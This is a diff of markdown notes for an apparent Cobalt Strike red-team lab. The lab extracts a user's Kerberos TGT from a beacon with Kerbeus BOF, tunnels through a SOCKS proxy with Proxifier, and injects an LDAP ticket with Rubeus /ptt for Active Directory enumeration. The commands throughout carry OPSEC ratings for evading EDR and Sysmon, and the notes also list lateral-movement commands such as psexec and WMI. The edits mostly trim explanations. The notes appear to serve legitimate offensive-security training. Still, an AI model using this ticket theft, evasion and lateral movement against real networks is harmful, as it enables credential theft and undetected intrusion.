@@ -1,6 +1,6 @@
 # SOCKS Pivoting Lab
 
-> **Objective:** Obtain an LDAP service ticket and use it to impersonate a user over a SOCKS proxy for domain enumeration — without touching LSASS or spawning suspicious child processes.
+> **Objective:** Obtain an LDAP service ticket and use it to impersonate a user over a SOCKS proxy for domain enumeration 🚨 without touching LSASS 🚨 nor spawning suspicious child processes.  
 
 **Lab flow summary:**
 ```
@@ -9,30 +9,20 @@ SYSTEM Beacon → krb_dump rsteel TGT → socks proxy on beacon
 → Rubeus asktgs LDAP ticket → PTT → RSAT enumeration through proxy
 ```
 
----
+## Prerequisites
 
-## Phase 1 — Dump TGT
-
-> **Why:** You need rsteel's TGT (Ticket Granting Ticket) to request downstream service tickets (LDAP, CIFS, etc.) without knowing the plaintext password. The TGT is cached in LSASS memory on the machine rsteel is logged into. We extract it via the Kerbeus BOF — which calls the Kerberos API directly rather than reading raw LSASS memory.
-
-### Prerequisites
-
-Load Kerbeus-BOF into your CS client before the lab begins (one-time per session):
+>krb_triage` and `krb_dump` are BOF commands added by Kerbeus-BOF loaded into your CS client  
 
 ```
 Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 ```
 
-> **Why:** `krb_triage` and `krb_dump` are BOF commands added by Kerbeus-BOF. Without loading the CNA the beacon will reject them. The BOF runs entirely inside the beacon thread — no sacrificial process, no fork-and-run, no child process.
-
----
-
-### Step 1 — Interact with the SYSTEM Beacon
+## Step 1 — Enumeration SYSTEM Beacon
 
 In the Cobalt Strike UI, click the SYSTEM-integrity beacon on the target workstation. Confirm you are SYSTEM before dumping:
 
 ```cs
-beacon> getuid
+getuid
 ```
 
 `OPSEC-🟢SAFE` — built-in, runs in beacon thread, no child process, no event log.
@@ -44,7 +34,7 @@ beacon> getuid
 ### Step 2 — List Cached Tickets (triage)
 
 ```cs
-beacon> krb_triage
+krb_triage
 ```
 
 `OPSEC-🟢SAFE` — BOF, Kerberos API call inside beacon thread. No process spawn, no LSASS memory read, no Event 4624/4648. Invisible to most EDR process-tree heuristics.
@@ -59,26 +49,22 @@ beacon> krb_triage
 
 ### Step 3 — Dump rsteel's TGT
 
+>Dump the TGT for rsteel users.  
+
 ```cs
-beacon> krb_dump /user:rsteel /service:krbtgt
+krb_dump /user:rsteel /service:krbtgt
 ```
 
 `OPSEC-🟢SAFE` — BOF, Kerberos API (`LsaCallAuthenticationPackage` → `KerbRetrieveEncodedTicketMessage`). Does NOT open a handle to LSASS process memory (avoids Event 10 / Sysmon LSASS access telemetry). Output is a base64-encoded `.kirbi` blob printed to the beacon console.
 
-> **Why not `mimikatz sekurlsa::tickets`?**  
-> `mimikatz` run directly in the beacon is `OPSEC-🔴UNSAFE` — it is one of the most-signatured payloads on the platform. Even `execute-assembly Rubeus.exe dump` is `OPSEC-🟠CAUTION` (spawns a sacrificial process via fork-and-run). `krb_dump` is the exam-day preferred method.
-
-> **Alternative if krb_dump is unavailable** (e.g., BOF fails on this target OS):
-> ```cs
-> beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /user:rsteel /service:krbtgt /nowrap
-> ```
-> `OPSEC-🟠CAUTION` — `execute-assembly` uses fork-and-run: spawns the process configured in `post-ex { spawnto_x64 }` (must NOT be the default `rundll32.exe`), injects the assembly, retrieves output via named pipe, then kills the process. Defender may still flag Rubeus.exe assembly content — test against current sig version.
-
----
+> `mimikatz` run directly in the beacon is `OPSEC-🔴UNSAFE`  
+>`execute-assembly Rubeus.exe dump` is `OPSEC-🟠CAUTION` spawns a sacrificial process via fork-and-run  
+>`krb_dump` is the exam-day preferred method OPSEC-🟢SAFE
 
 ### Step 4 — Save the Encoded Ticket
 
-Copy the entire base64 blob from the beacon console output. Open Notepad or VSCode on the Attacker Desktop and paste it. You will reference it as `[ENCODED TGT]` in the next phase.
+Copy the entire base64 blob from the beacon console output.  
+Open Notepad or VSCode on the Attacker Desktop and paste it. You will reference it as `[ENCODED TGT]` in the next phase.  
 
 > **Tip:** The base64 blob is a single line. If it word-wraps in the console, select-all from the beacon output pane and paste into a text editor first to de-wrap it. Rubeus `asktgs` will reject a ticket with embedded newlines.
 
@@ -100,7 +86,7 @@ beacon> socks 1080 socks5
 
 > **Port note:** `1080` is the default SOCKS port. Any unused port on the team server works. If you run multiple proxy pivots (e.g., into a second forest), use different ports (`1081`, `1082`).
 
-The Cobalt Strike client is no longer needed after this step — minimise it.
+❗ Cobalt Strike client is no longer needed after this step ❗  
 
 ---
 
@@ -110,21 +96,11 @@ The Cobalt Strike client is no longer needed after this step — minimise it.
 
 ### Add Static Hosts Entries
 
-Open Terminal **as Administrator** on the Attacker Desktop (required to write to `drivers\etc\hosts`):
+💡  Terminal **as Administrator** on the Attacker Desktop 💡  to write to `drivers\etc\hosts`💡  
 
 ```powershell
 Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
 ```
-
-> **Verify resolution before proceeding:**
-> ```powershell
-> Resolve-DnsName lon-dc-1
-> ```
-> Expected: returns `10.10.120.1`. If it fails, check that Terminal was run as admin and that no existing conflicting entry exists in the hosts file.
-
-> **Cleanup (post-lab):** Remove the line from hosts when done. Leaving stale entries may cause resolution issues in future labs if IPs change.
-
----
 
 ## Phase 4 — Proxifier
 
@@ -203,7 +179,6 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /tic
 
 Replace `[ENCODED TGT]` with the full base64 blob saved in Phase 1.
 
-> **What this does step-by-step:**
 > 1. Rubeus sends a `TGS-REQ` to `lon-dc-1` (through the SOCKS proxy via Proxifier) using rsteel's TGT.
 > 2. The DC validates the TGT, issues an LDAP service ticket (`TGS-REP`) for `ldap/lon-dc-1` encrypted with rsteel's session key.
 > 3. `/ptt` (Pass-the-Ticket) injects the resulting service ticket into the current logon session's Kerberos cache — no kirbi file written to disk.
@@ -251,9 +226,9 @@ Get-ADUser -Filter * -Server lon-dc-1
 Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
 ```
 
-`OPSEC-🟢SAFE` (from target network perspective) — LDAP queries arrive at the DC from the beacon's host IP (tunnelled through the SOCKS proxy). The DC sees standard LDAP bind + query operations from what it believes is rsteel's workstation. No PowerShell.exe on a **target** host, no child process, no Sysmon events on targets.
+`OPSEC-🟢SAFE` LDAP queries arrive at the DC from the beacon's host IP (tunnelled through the SOCKS proxy). The DC sees standard LDAP bind + query operations from what it believes is rsteel's workstation. No PowerShell.exe on a **target** host, no child process, no Sysmon events on targets.
 
-> **Expand the enumeration for exam-day:**
+> **EXTRA exam ENUMERATION**
 > ```powershell
 > # SPNs (Kerberoast targets)
 > Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1
@@ -268,31 +243,6 @@ Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
 > # GPOs
 > Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
 > ```
-
----
-
-## Lab Recap — OPSEC Summary
-
-| Step | Command / Action | OPSEC Rating | Why |
-|------|-----------------|--------------|-----|
-| Triage Kerberos tickets | `krb_triage` | `🟢SAFE` | BOF, Kerberos API, no LSASS read, no child process |
-| Dump TGT | `krb_dump /user:rsteel /service:krbtgt` | `🟢SAFE` | BOF, Kerberos API, no LSASS handle |
-| Start SOCKS proxy | `socks 1080 socks5` | `🟢SAFE` | In-channel tunnel, listener on team server not target |
-| Add DNS hosts | `Add-Content ... hosts` | `🟢SAFE` (attacker desktop only) | Local file write on your own machine |
-| Request LDAP ST + PTT | `Rubeus.exe asktgs /ptt` | `🟠CAUTION` (attacker desktop) | Rubeus signatured by Defender — runs locally not on target |
-| AD enumeration | `Get-ADComputer/User/OU` | `🟢SAFE` | Native signed binaries, standard LDAP queries |
-
-### What NOT to do in this lab (exam OPSEC-🔴UNSAFE traps)
-
-| Trap | Why it costs points |
-|------|---------------------|
-| `mimikatz sekurlsa::tickets` instead of `krb_dump` | Runs Mimikatz in beacon — OPSEC-🔴UNSAFE, well-signatured |
-| `execute-assembly Rubeus.exe dump` without spawnto override | Fork-and-run from default `rundll32.exe` — signatured, spawns visible child |
-| `shell klist` to verify tickets | Spawns `cmd.exe` as beacon child — OPSEC-🔴UNSAFE |
-| Proxying ALL traffic through Proxifier (default rule) | Breaks attacker desktop internet; also noisy to security monitoring on a real engagement |
-| Requesting TGS for `ldap/*` for all DCs at once | Generates burst of TGS-REQ in DC event logs — request only what you need |
-
----
 
 > **Lab complete.** You have demonstrated: BOF-based ticket extraction → SOCKS tunnel → Proxifier routing → Kerberos PTT → native LDAP enumeration. No raw LSASS read, no child processes on targets, no tooling dropped to disk on the target network.
 
@@ -342,13 +292,6 @@ beacon> sleep 3000 20    // restore: 3s sleep, 20% jitter
 
 > `OPSEC-🟠CAUTION` — `sleep 0` beacons continuously and is significantly noisier. Use only for the duration of the proxy task window, then restore immediately.
 
-### Proxifier timeout log — what it looks like
-
-```
-[timestamp] powershell.exe - 10.10.120.1:9389 open through proxy 10.0.0.5:1080 SOCKS5    ← working
-[timestamp] powershell.exe - 10.10.120.1:9389 close, X bytes sent, Y bytes received       ← closed cleanly
-[timestamp] powershell.exe - 10.10.120.1:9389 error: Could not connect through proxy      ← beacon dead/sleeping
-```
 
 Port `9389` is the AD Web Services port used by RSAT cmdlets (ADWS — alternative to port 389 LDAP). Timeouts on this port mean RSAT cmdlets are failing silently or hanging.
 
@@ -467,16 +410,4 @@ beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — no 
 beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — last resort only
 
 beacon> rev2self                                    // drop token after move succeeds
-```
-
-### Priority stack summary
-
-```
-1. krb_dump all live users on foothold (free tickets, time-limited)
-2. Group membership sweep → identify DA/EA members
-3. SPN enumeration → targeted Kerberoast → offline crack
-4. AS-REP roast check (parallel to step 3)
-5. ADCS host check → Certify ESC scan
-6. ACL sweep → GenericWrite/WriteDACL paths
-7. Lateral move with best available credential/ticket
 ```
